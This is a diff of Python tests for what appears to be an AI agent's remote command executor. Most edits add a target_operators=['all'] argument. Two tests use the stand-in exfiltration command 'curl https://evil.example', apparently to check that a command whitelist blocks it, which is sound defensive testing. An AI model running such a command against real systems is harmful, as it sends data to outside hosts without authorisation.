@@ -319,7 +319,7 @@ class TestExecuteCommandTargetSystems:
         op = self._make_operator("op-1", "sess-1", "host-1")
         investigation = self._make_investigation([op])
         g8e_context = self._make_g8e_context()
-        args = ExecutorCommandArgs(command="ls", request="test")
+        args = ExecutorCommandArgs(command="ls", request="test", target_operators=["all"])
 
         from app.models.settings import CommandValidationSettings, G8eeUserSettings, LLMSettings
         request_settings = G8eeUserSettings(
@@ -362,7 +362,6 @@ class TestExecuteCommandTargetSystems:
         args = ExecutorCommandArgs(
             command="uptime",
             request="batch check",
-            target_operator="op-1",
             target_operators=["op-1", "op-2"],
         )
 
@@ -510,7 +509,7 @@ class TestExecuteCommandTargetSystems:
         op = self._make_operator("op-1", "sess-1", "host-1")
         investigation = self._make_investigation([op])
         g8e_context = self._make_g8e_context()
-        args = ExecutorCommandArgs(command="uptime", request="health check")
+        args = ExecutorCommandArgs(command="uptime", request="health check", target_operators=["all"])
 
         request_settings = G8eeUserSettings(
             llm=LLMSettings(),
@@ -555,7 +554,7 @@ class TestExecuteCommandTargetSystems:
         op = self._make_operator("op-1", "sess-1", "host-1")
         investigation = self._make_investigation([op])
         g8e_context = self._make_g8e_context()
-        args = ExecutorCommandArgs(command="uptime", request="health check")
+        args = ExecutorCommandArgs(command="uptime", request="health check", target_operators=["all"])
 
         request_settings = G8eeUserSettings(
             llm=LLMSettings(),
@@ -598,7 +597,7 @@ class TestExecuteCommandTargetSystems:
         op = self._make_operator("op-1", "sess-1", "host-1")
         investigation = self._make_investigation([op])
         g8e_context = self._make_g8e_context()
-        args = ExecutorCommandArgs(command="rm /tmp/test", request="cleanup")
+        args = ExecutorCommandArgs(command="rm /tmp/test", request="cleanup", target_operators=["all"])
 
         request_settings = G8eeUserSettings(
             llm=LLMSettings(),
@@ -641,7 +640,7 @@ class TestExecuteCommandTargetSystems:
         op = self._make_operator("op-1", "sess-1", "host-1")
         investigation = self._make_investigation([op])
         g8e_context = self._make_g8e_context()
-        args = ExecutorCommandArgs(command="uptime", request="health check")
+        args = ExecutorCommandArgs(command="uptime", request="health check", target_operators=["all"])
 
         request_settings = G8eeUserSettings(
             llm=LLMSettings(),
@@ -687,7 +686,7 @@ class TestExecuteCommandTargetSystems:
         investigation = self._make_investigation([op])
         g8e_context = self._make_g8e_context()
         # 'curl' is on auto-approve but NOT in the whitelist.
-        args = ExecutorCommandArgs(command="curl https://evil.example", request="exfil")
+        args = ExecutorCommandArgs(command="curl https://evil.example", request="exfil", target_operators=["all"])
 
         request_settings = G8eeUserSettings(
             llm=LLMSettings(),
@@ -735,7 +734,7 @@ class TestExecuteCommandTargetSystems:
         op = self._make_operator("op-1", "sess-1", "host-1")
         investigation = self._make_investigation([op])
         g8e_context = self._make_g8e_context()
-        args = ExecutorCommandArgs(command="curl https://evil.example", request="exfil")
+        args = ExecutorCommandArgs(command="curl https://evil.example", request="exfil", target_operators=["all"])
 
         request_settings = G8eeUserSettings(
             llm=LLMSettings(),
@@ -775,7 +774,7 @@ class TestExecuteCommandTargetSystems:
         op = self._make_operator("op-abc", "sess-abc", "db-server")
         investigation = self._make_investigation([op])
         g8e_context = self._make_g8e_context()
-        args = ExecutorCommandArgs(command="df -h", request="disk check")
+        args = ExecutorCommandArgs(command="df -h", request="disk check", target_operators=["all"])
 
         from app.models.settings import CommandValidationSettings, G8eeUserSettings, LLMSettings
         request_settings = G8eeUserSettings(
